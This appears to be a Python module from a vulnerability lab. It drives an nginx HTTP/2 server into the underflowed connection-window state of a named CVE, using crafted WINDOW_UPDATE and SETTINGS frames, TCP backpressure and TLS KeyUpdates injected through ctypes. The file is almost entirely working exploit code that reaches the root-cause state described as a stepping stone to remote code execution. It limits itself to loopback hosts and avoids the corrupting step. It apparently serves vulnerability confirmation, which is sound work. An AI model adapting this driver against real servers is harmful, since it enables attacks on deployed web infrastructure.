"""HTTP/2 connection-window counter driver (lab-local, accounting-safe).

Drives a peer toward the CVE-2026-123007 *accounting* state:

  1. Exhaust the initial 65,535-byte connection window with public bodies.
  2. Under TCP backpressure, queue two full responses (stream credit only).
  3. Raise connection credit to MAX, push those streams to MAX-1, then
     SETTINGS_INITIAL_WINDOW_SIZE += 2 so nginx RSTs them with
     FLOW_CONTROL_ERROR while cleanup refunds the queued DATA *above* MAX.
  4. Send another connection WINDOW_UPDATE(MAX). A correct peer rejects it;
     a vulnerable peer accepts it (unsigned underflow in the allowance check).
  5. Prove acceptance with a canary Range response + post-refund PING ACK.

Traffic: on the order of ~7–15 MiB (carrier + optional TLS KeyUpdates), not
the ~119 GiB RCE path. We never send a corrupting length.

Framing is ours (see framing.py). TLS uses stdlib ssl.MemoryBIO; KeyUpdate
uses libssl via ctypes (same technique as the public Rapid7 trigger, verified
on this box's CPython 3.13 / OpenSSL 3.5).
"""

from __future__ import annotations

import ctypes
import socket
import ssl
import time
from dataclasses import dataclass
from typing import Callable
from urllib.parse import urlsplit

from . import framing as F
from .oracle import FlowControlObservation


INITIAL_CONN_WINDOW = 65535
DEFAULT_CARRIER_APP_BYTES = 7_340_032  # matches public trigger calibration
DEFAULT_KEY_UPDATES = 262_144          # ~7 MiB TLS records; optional but stabilizes


def fill_wave(body_size: int) -> tuple[int, int]:
    """How many extra full responses + range-end fill the 65,535 window.

    After two probe responses of `body_size`, remaining = 65535 - 2*body_size.
    We take as many full bodies as fit, then a Range of the leftover bytes.
    Returns (additional_full_count, range_end_inclusive).
    """
    if body_size <= 0:
        raise ValueError("body_size must be positive")
    remaining = INITIAL_CONN_WINDOW - 2 * body_size
    if remaining < 0:
        raise ValueError(f"body_size {body_size} too large for initial window")
    additional = remaining // body_size
    leftover = remaining - additional * body_size
    if leftover == 0:
        # Need at least one Range byte for the exhaustion pattern used here.
        if additional == 0:
            raise ValueError("cannot fill window with this body size")
        additional -= 1
        leftover = body_size
    range_end = leftover - 1
    return additional, range_end


@dataclass
class DriverConfig:
    url: str = "https://127.0.0.1:19443/"
    path: str = "/index.html"
    carrier_app_bytes: int = DEFAULT_CARRIER_APP_BYTES
    key_updates: int = DEFAULT_KEY_UPDATES
    connect_timeout: float = 5.0
    backpressure_rcvbuf: int = 1024
    normal_rcvbuf: int = 262_144
    log: Callable[[str], None] = print


class H2Session:
    """Thin TLS+HTTP/2 byte pipe with a frame ledger (server→client only)."""

    def __init__(self, host: str, port: int, cfg: DriverConfig):
        self.cfg = cfg
        self.host = host
        self.port = port
        self.authority = host if port == 443 else f"{host}:{port}"
        self.raw = socket.create_connection((host, port), timeout=cfg.connect_timeout)
        self.raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, 1460)
        self.raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, cfg.normal_rcvbuf)
        try:
            self.raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, cfg.normal_rcvbuf)
        except OSError:
            pass

        self.incoming = ssl.MemoryBIO()
        self.outgoing = ssl.MemoryBIO()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = ctx.maximum_version = ssl.TLSVersion.TLSv1_3
        ctx.set_alpn_protocols(["h2"])
        self.tls = ctx.wrap_bio(self.incoming, self.outgoing, server_hostname=host)

        self._buffer = bytearray()
        self.frames: list[tuple[int, int, int, bytes]] = []
        self.negotiated_h2 = False
        self._ssl_ptr = None

    def _flush(self) -> None:
        data = self.outgoing.read()
        if data:
            self.raw.sendall(data)

    def handshake(self) -> None:
        while True:
            try:
                self.tls.do_handshake()
                self._flush()
                break
            except ssl.SSLWantReadError:
                self._flush()
                chunk = self.raw.recv(self.cfg.normal_rcvbuf)
                if not chunk:
                    raise RuntimeError("connection closed during TLS handshake")
                self.incoming.write(chunk)
        alpn = self.tls.selected_alpn_protocol()
        self.negotiated_h2 = alpn == "h2"
        if not self.negotiated_h2:
            raise RuntimeError(f"ALPN negotiated {alpn!r}, want 'h2'")
        self._ssl_ptr = self._locate_ssl_ptr()

    def _locate_ssl_ptr(self):
        """Resolve OpenSSL SSL* from CPython's _sslobj without mutating TLS state.

        CPython 3.10–3.13 store the SSL* at offset 24 on the _sslobj. We confirm
        with SSL_is_init_finished (read-only) instead of a probe KeyUpdate, which
        would desync the peer if its ciphertext were discarded.
        """
        lib = ctypes.CDLL("libssl.so.3")
        lib.SSL_is_init_finished.argtypes = (ctypes.c_void_p,)
        lib.SSL_is_init_finished.restype = ctypes.c_int
        sslobj = self.tls._sslobj
        for off in (24, 16, 32, 40, 8):
            try:
                ptr = ctypes.c_void_p.from_address(id(sslobj) + off).value
            except Exception:
                continue
            if not ptr:
                continue
            try:
                if lib.SSL_is_init_finished(ptr) == 1:
                    return ptr
            except Exception:
                continue
        return None

    def encrypt(self, data: bytes) -> None:
        view = memoryview(data)
        while view:
            view = view[self.tls.write(view) :]

    def send(self, data: bytes) -> None:
        self.encrypt(data)
        self._flush()

    def _remember(self, plaintext: bytes) -> None:
        self._buffer.extend(plaintext)
        frames, rest = F.parse_frames(bytes(self._buffer))
        self.frames.extend(frames)
        self._buffer = bytearray(rest)

    def drain(self, seconds: float) -> tuple[bytes, bool]:
        plaintext = bytearray()
        deadline = time.monotonic() + seconds
        self.raw.settimeout(0.25)
        alive = True
        while time.monotonic() < deadline:
            try:
                data = self.raw.recv(self.cfg.normal_rcvbuf)
                if not data:
                    alive = False
                    break
                self.incoming.write(data)
                while True:
                    try:
                        clear = self.tls.read(self.cfg.normal_rcvbuf)
                        if not clear:
                            alive = False
                            return bytes(plaintext), False
                        plaintext.extend(clear)
                        self._remember(clear)
                    except ssl.SSLWantReadError:
                        break
                self._flush()
            except socket.timeout:
                pass
        return bytes(plaintext), alive

    def set_backpressure(self, enable: bool) -> None:
        size = self.cfg.backpressure_rcvbuf if enable else self.cfg.normal_rcvbuf
        self.raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, size)
        try:
            self.raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, size)
        except OSError:
            pass

    def send_flight_with_key_updates(self, application: bytes, key_updates: int) -> None:
        """Encrypt application bytes, append KeyUpdates, deliver as one TCP flight."""
        self.encrypt(application)
        flight = bytearray(self.outgoing.read())
        if key_updates:
            if self._ssl_ptr is None:
                raise RuntimeError(
                    "TLS KeyUpdate requested but SSL* was not located; "
                    "rerun with key_updates=0 or fix ctypes offset"
                )
            lib = ctypes.CDLL("libssl.so.3")
            lib.SSL_key_update.argtypes = (ctypes.c_void_p, ctypes.c_int)
            lib.SSL_key_update.restype = ctypes.c_int
            lib.SSL_do_handshake.argtypes = (ctypes.c_void_p,)
            lib.SSL_do_handshake.restype = ctypes.c_int
            for i in range(key_updates):
                if lib.SSL_key_update(self._ssl_ptr, 1) != 1:
                    raise RuntimeError(f"SSL_key_update failed at {i}")
                if lib.SSL_do_handshake(self._ssl_ptr) != 1:
                    raise RuntimeError(f"SSL_do_handshake after KeyUpdate failed at {i}")
                flight.extend(self.outgoing.read())
        self.raw.settimeout(600)
        self.raw.sendall(flight)

    def data_for_stream(self, stream: int) -> bytes:
        return b"".join(
            payload
            for kind, _flags, sid, payload in self.frames
            if kind == F.DATA and sid == stream
        )

    def rst_errors(self) -> dict[int, int]:
        out: dict[int, int] = {}
        for kind, _flags, sid, payload in self.frames:
            if kind == F.RST_STREAM and len(payload) == 4:
                out[sid] = int.from_bytes(payload, "big")
        return out

    def close(self) -> None:
        try:
            self.raw.close()
        except OSError:
            pass


def build_cleanup_event(
    authority: str,
    path: str,
    body_size: int,
    target_streams: tuple[int, int],
    release_stream: int,
) -> bytes:
    """The root-cause frame sequence (connection counter past MAX)."""
    reserved = 2 * body_size
    t0, t1 = target_streams
    return (
        F.window_update(0, reserved)
        + F.window_update(0, F.MAX_WINDOW)
        + F.window_update(t0, F.MAX_WINDOW - 1)
        + F.window_update(t1, F.MAX_WINDOW - 1)
        + F.settings_initial_window(2)  # delta +2 vs prior 0 → illegal stream windows
        + F.window_update(0, F.MAX_WINDOW)  # must be rejected if over-credited; accepted if underflowed
        + F.settings_initial_window(65535)
        + F.get_request(release_stream, authority, path, F.range_literal(0, 9))
    )


def build_carrier(stream: int, authority: str, path: str, total_app_bytes: int, event_len: int) -> bytes:
    """Large HEADERS filler so the cleanup event rides in one prepared flight."""
    head = F.head_request_block(authority, path)
    # total_app_bytes counts carrier frame + event bytes, matching public trigger.
    filler_len = total_app_bytes - event_len - 9 - len(head)
    if filler_len < 0:
        raise ValueError(
            f"carrier_app_bytes {total_app_bytes} too small for event ({event_len}) + HEAD"
        )
    block = b"\x20" * filler_len + head
    return F.headers_frame(stream, block, True)


def run_accounting_probe(cfg: DriverConfig | None = None) -> FlowControlObservation:
    """Run the safe accounting sequence; return oracle-ready observations."""
    cfg = cfg or DriverConfig()
    log = cfg.log
    parts = urlsplit(cfg.url)
    if parts.scheme != "https":
        raise ValueError("only https:// targets are supported (need ALPN h2)")
    host = parts.hostname or "127.0.0.1"
    port = parts.port or 443
    path = cfg.path or parts.path or "/index.html"
    if not path.startswith("/"):
        path = "/" + path

    # Loopback-only safety for this lab tool.
    if host not in ("127.0.0.1", "localhost", "::1"):
        raise ValueError(
            f"refusing non-loopback host {host!r}; this driver is lab-local only"
        )

    session = H2Session(host, port, cfg)
    try:
        session.handshake()
        log(f"[*] TLS+ALPN h2 ok → {host}:{port} path={path}")

        # Preface + SETTINGS; drain server SETTINGS before requests.
        session.send(F.client_preface_settings())
        session.drain(1.0)
        session.send(F.settings_ack())

        # Two probe GETs — learn body size.
        session.send(F.get_request(1, session.authority, path) + F.get_request(3, session.authority, path))
        session.drain(2.0)
        body = session.data_for_stream(1)
        body_size = len(body)
        if body_size == 0:
            body = session.data_for_stream(3)
            body_size = len(body)
        if body_size == 0:
            raise RuntimeError("probe responses had empty bodies")
        if not (521 <= body_size <= 8192):
            raise RuntimeError(
                f"body size {body_size} outside 521..8192 (safe accounting wave)"
            )
        log(f"[*] learned body_size={body_size}")

        additional, range_end = fill_wave(body_size)
        # Exhaust remaining window: streams 5,7,... then a Range.
        full_streams = list(range(5, 5 + 2 * additional, 2))
        range_stream = 5 + 2 * additional
        packet = b"".join(F.get_request(s, session.authority, path) for s in full_streams)
        packet += F.get_request(
            range_stream, session.authority, path, F.range_literal(0, range_end)
        )
        session.send(packet)
        session.drain(3.0)
        log(
            f"[*] initial window exhausted "
            f"(2 probe + {additional} full + range 0-{range_end})"
        )

        # Queue two bodies with stream credit only (connection window ≈ 0).
        session.set_backpressure(True)
        target_a = range_stream + 2
        target_b = range_stream + 4
        carrier_stream = range_stream + 6
        release_stream = range_stream + 8

        session.send(F.settings_initial_window(0))
        time.sleep(0.05)
        session.send(
            F.get_request(target_a, session.authority, path)
            + F.get_request(target_b, session.authority, path)
        )
        time.sleep(0.05)
        session.send(
            F.window_update(target_a, body_size) + F.window_update(target_b, body_size)
        )
        time.sleep(0.05)
        log(f"[*] queued targets streams={target_a},{target_b} under backpressure")

        event = build_cleanup_event(
            session.authority, path, body_size, (target_a, target_b), release_stream
        )
        carrier = build_carrier(
            carrier_stream, session.authority, path, cfg.carrier_app_bytes, len(event)
        )
        log(
            f"[*] sending cleanup flight "
            f"(carrier+event={len(carrier)+len(event)} bytes, "
            f"key_updates={cfg.key_updates})"
        )
        session.send_flight_with_key_updates(carrier + event, cfg.key_updates)
        time.sleep(2.0)

        session.set_backpressure(False)
        session.drain(30.0)

        # Post-refund liveness probe.
        ping_payload = b"INTBUG01"
        before = len(session.frames)
        session.send(F.ping(ping_payload))
        _pt, alive = session.drain(5.0)
        ping_acked = any(
            kind == F.PING and (flags & F.ACK) and sid == 0 and payload == ping_payload
            for kind, flags, sid, payload in session.frames[before:]
        )

        release_body = session.data_for_stream(release_stream)
        expected_canary = body[:10]
        rst = session.rst_errors()

        log(
            f"[*] observations: rst={ {k: rst.get(k) for k in (target_a, target_b)} } "
            f"canary={len(release_body)} ping_ack={ping_acked} alive={alive}"
        )

        return FlowControlObservation(
            expected_fc_reset_streams=(target_a, target_b),
            rst_errors=rst,
            canary_body=release_body,
            expected_canary_body=expected_canary,
            post_refund_ping_acked=ping_acked and alive,
            negotiated_h2=True,
            extras={
                "body_size": body_size,
                "authority": session.authority,
                "path": path,
                "release_stream": release_stream,
                "carrier_app_bytes": cfg.carrier_app_bytes,
                "key_updates": cfg.key_updates,
            },
        )
    finally:
        session.close()
